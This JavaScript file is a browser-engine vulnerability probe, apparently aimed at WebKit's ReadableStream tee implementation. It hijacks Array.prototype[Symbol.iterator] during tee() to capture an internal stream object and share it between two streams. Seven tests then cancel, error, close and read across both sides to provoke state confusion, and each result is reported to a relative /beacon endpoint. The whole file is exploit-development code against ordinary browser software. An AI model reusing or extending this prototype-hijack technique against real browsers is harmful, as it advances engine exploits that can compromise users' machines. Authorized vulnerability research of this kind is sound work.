/*
 * p434c -- Unlocked state collision via shared internal
 *
 * V434B showed: lock IS shared, blocks cancel/getReader from other side.
 * KEY INSIGHT: Cancel sideB BEFORE anyone locks = no lock to block it.
 * Then sideA tries to read from a cancelled/closed internal.
 *
 * Tests:
 *   A: Cancel sideB first, then getReader+read on sideA
 *   B: Cancel sideB first, then Response(sideA).text()
 *   C: Cancel BOTH sides (no readers) -- double cancel
 *   D: Cancel sideB, then pipeTo from sideA
 *   E: getReader on sideB, read (drains queue), release, then getReader on sideA
 *   F: Error the internal via controller.error, then read from sideA
 *   G: Close the internal via controller.close, enqueue AFTER close, read from sideA
 *
 * Beacon prefix: V434C-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V434C-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function createSharedStream() {
  var ctrlA = null;
  var rsA = new ReadableStream({
    start: function(c) { ctrlA = c; }
  });

  var realInternal = null;
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realInternal = self[1];
        var items = [self[0], self[1]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var branchesA;
  try {
    branchesA = rsA.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }

  if (!realInternal) return null;

  var rsB = new ReadableStream({
    start: function(c) {}
  });

  intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0], realInternal];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var branchesB;
  try {
    branchesB = rsB.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }

  return {
    sideA: branchesA[1],
    sideB: branchesB[1],
    branch0A: branchesA[0],
    branch0B: branchesB[0],
    ctrlA: ctrlA,
    internal: realInternal
  };
}

// ================================================================
// Test A: Cancel sideB FIRST (unlocked), then read from sideA
// ================================================================
function testA() {
  B("A-START");
  var s = createSharedStream();
  if (!s) { B("A-SETUP-FAIL"); return; }

  // Cancel sideB BEFORE anyone gets a reader
  s.sideB.cancel("pre-lock-cancel").then(function() {
    B("A-CANCEL-OK");

    // Now try to read from sideA -- internal should be cancelled
    try {
      var reader = s.sideA.getReader();
      B("A-READER-OK");

      // Enqueue data through ctrlA
      try {
        s.ctrlA.enqueue("POST-CANCEL-DATA");
        B("A-ENQUEUE-OK");
      } catch(e) {
        B("A-ENQUEUE-ERR", e.message.slice(0, 60));
      }

      // Drive tee pull
      try {
        var r0 = s.branch0A.getReader();
        r0.read().then(function(r) {
          B("A-R0-READ", {done: r.done, val: String(r.value).slice(0, 40)});
        }).catch(function(e) {
          B("A-R0-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("A-R0-EXCEPT", e.message.slice(0, 40));
      }

      reader.read().then(function(r) {
        B("A-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
      }).catch(function(e) {
        B("A-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("A-READER-ERR", e.message.slice(0, 60));
    }
  }).catch(function(e) {
    B("A-CANCEL-ERR", e.message.slice(0, 60));
  });
}

// ================================================================
// Test B: Cancel sideB first, then Response(sideA).text()
// ================================================================
function testB() {
  B("B-START");
  var s = createSharedStream();
  if (!s) { B("B-SETUP-FAIL"); return; }

  s.sideB.cancel("cancel-for-response").then(function() {
    B("B-CANCEL-OK");

    s.ctrlA.enqueue("RESPONSE-DATA");
    s.ctrlA.close();

    try {
      var r0 = s.branch0A.getReader();
      r0.read();
    } catch(e) {}

    try {
      var resp = new Response(s.sideA);
      B("B-RESP-OK", resp.status);
      resp.text().then(function(t) {
        B("B-TEXT!!!", {len: t.length, val: t.slice(0, 60)});
      }).catch(function(e) {
        B("B-TEXT-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("B-RESP-ERR", e.message.slice(0, 60));
    }
  }).catch(function(e) {
    B("B-CANCEL-ERR", e.message.slice(0, 60));
  });
}

// ================================================================
// Test C: Double cancel -- cancel both sides without any readers
// ================================================================
function testC() {
  B("C-START");
  var s = createSharedStream();
  if (!s) { B("C-SETUP-FAIL"); return; }

  var cancelCount = 0;
  function onCancel(side) {
    return function() {
      cancelCount++;
      B("C-CANCEL-" + side, cancelCount);
      if (cancelCount === 2) {
        B("C-BOTH-CANCELLED");
        // Try to read after both cancelled
        try {
          var reader = s.sideA.getReader();
          B("C-READER-OK");
          reader.read().then(function(r) {
            B("C-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
          }).catch(function(e) {
            B("C-READ-ERR", e.message.slice(0, 60));
          });
        } catch(e) {
          B("C-READER-ERR", e.message.slice(0, 60));
        }
      }
    };
  }

  s.sideA.cancel("cancel-A").then(onCancel("A")).catch(function(e) {
    B("C-CANCEL-A-ERR", e.message.slice(0, 60));
  });
  s.sideB.cancel("cancel-B").then(onCancel("B")).catch(function(e) {
    B("C-CANCEL-B-ERR", e.message.slice(0, 60));
  });
}

// ================================================================
// Test D: getReader on sideB, read and drain, release reader,
//         THEN getReader on sideA and read
// ================================================================
function testD() {
  B("D-START");
  var s = createSharedStream();
  if (!s) { B("D-SETUP-FAIL"); return; }

  s.ctrlA.enqueue("D-DATA-1");
  s.ctrlA.enqueue("D-DATA-2");

  // Drive tee by reading from branch0A first
  var r0 = s.branch0A.getReader();
  r0.read().then(function() { return r0.read(); }).then(function() {
    B("D-FLUSHED");

    // Now read from sideB to drain the shared internal's queue
    var readerB = s.sideB.getReader();
    B("D-READER-B-OK");

    return readerB.read().then(function(r) {
      B("D-B-READ-1", {done: r.done, val: String(r.value).slice(0, 40)});
      return readerB.read();
    }).then(function(r) {
      B("D-B-READ-2", {done: r.done, val: String(r.value).slice(0, 40)});
      // Release B's reader
      readerB.releaseLock();
      B("D-B-RELEASED");

      // Now get reader on sideA -- shared internal was drained by B
      var readerA = s.sideA.getReader();
      B("D-READER-A-OK");

      // Enqueue more data
      s.ctrlA.enqueue("D-DATA-3");
      s.ctrlA.close();
      r0.releaseLock();
      var r0b = s.branch0A.getReader();
      r0b.read();

      return readerA.read();
    }).then(function(r) {
      B("D-A-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    });
  }).catch(function(e) {
    B("D-ERR", e.message.slice(0, 60));
  });
}

// ================================================================
// Test E: Error the controller, then read from sideA
// controller.error() does NOT check stream lock
// ================================================================
function testE() {
  B("E-START");
  var s = createSharedStream();
  if (!s) { B("E-SETUP-FAIL"); return; }

  // Error the controller before anyone reads
  try {
    s.ctrlA.error(new Error("FORCED-ERROR"));
    B("E-ERROR-OK");
  } catch(e) {
    B("E-ERROR-ERR", e.message.slice(0, 60));
  }

  // Drive branch0A to propagate error through tee
  try {
    var r0 = s.branch0A.getReader();
    r0.read().then(function(r) {
      B("E-R0-READ", {done: r.done});
    }).catch(function(e) {
      B("E-R0-ERR", e.message.slice(0, 60));
    });
  } catch(e) {}

  // Now try reading from sideA
  setTimeout(function() {
    try {
      var readerA = s.sideA.getReader();
      B("E-READER-A-OK");

      readerA.read().then(function(r) {
        B("E-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
      }).catch(function(e) {
        B("E-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("E-READER-ERR", e.message.slice(0, 60));
    }
  }, 50);
}

// ================================================================
// Test F: Close controller, try to enqueue AFTER close, read from sideA
// Compiled-out assert: @assert(state === @streamReadable)
// ================================================================
function testF() {
  B("F-START");
  var s = createSharedStream();
  if (!s) { B("F-SETUP-FAIL"); return; }

  s.ctrlA.enqueue("F-BEFORE-CLOSE");
  s.ctrlA.close();
  B("F-CLOSED");

  // Try enqueue after close
  try {
    s.ctrlA.enqueue("F-AFTER-CLOSE");
    B("F-POST-CLOSE-ENQUEUE-OK!!!");
  } catch(e) {
    B("F-POST-CLOSE-ENQUEUE-ERR", e.message.slice(0, 60));
  }

  // Read from sideA
  try {
    var r0 = s.branch0A.getReader();
    r0.read();

    var reader = s.sideA.getReader();
    reader.read().then(function(r) {
      B("F-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
      return reader.read();
    }).then(function(r) {
      B("F-READ-2", {done: r.done});
    }).catch(function(e) {
      B("F-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("F-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test G: Alternate reads between sideA and sideB (release locks between)
// Drain shared internal from alternating sides to confuse queue
// ================================================================
function testG() {
  B("G-START");
  var s = createSharedStream();
  if (!s) { B("G-SETUP-FAIL"); return; }

  // Pre-enqueue data
  for (var i = 0; i < 6; i++) s.ctrlA.enqueue("G-" + i);
  s.ctrlA.close();

  // Flush through tee
  var r0 = s.branch0A.getReader();
  var flushChain = Promise.resolve();
  for (var i = 0; i < 6; i++) {
    flushChain = flushChain.then(function() { return r0.read(); });
  }

  flushChain.then(function() {
    B("G-FLUSHED");
    r0.releaseLock();

    // Alternate: B reads 1, release, A reads 1, release, etc.
    function readOne(side, label) {
      return new Promise(function(resolve, reject) {
        var reader = side.getReader();
        reader.read().then(function(r) {
          B("G-" + label, {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 20)});
          reader.releaseLock();
          resolve(r);
        }).catch(function(e) {
          B("G-" + label + "-ERR", e.message.slice(0, 40));
          try { reader.releaseLock(); } catch(e2) {}
          reject(e);
        });
      });
    }

    return readOne(s.sideB, "B1")
      .then(function() { return readOne(s.sideA, "A1"); })
      .then(function() { return readOne(s.sideB, "B2"); })
      .then(function() { return readOne(s.sideA, "A2"); })
      .then(function() { return readOne(s.sideB, "B3"); })
      .then(function() { return readOne(s.sideA, "A3"); });
  }).then(function() {
    B("G-COMPLETE");
  }).catch(function(e) {
    B("G-ERR", e.message.slice(0, 60));
  });
}

testA();
setTimeout(function() { testB(); }, 300);
setTimeout(function() { testC(); }, 600);
setTimeout(function() { testD(); }, 900);
setTimeout(function() { testE(); }, 1200);
setTimeout(function() { testF(); }, 1500);
setTimeout(function() { testG(); }, 1800);
setTimeout(function() { B("DONE"); }, 4000);
})();
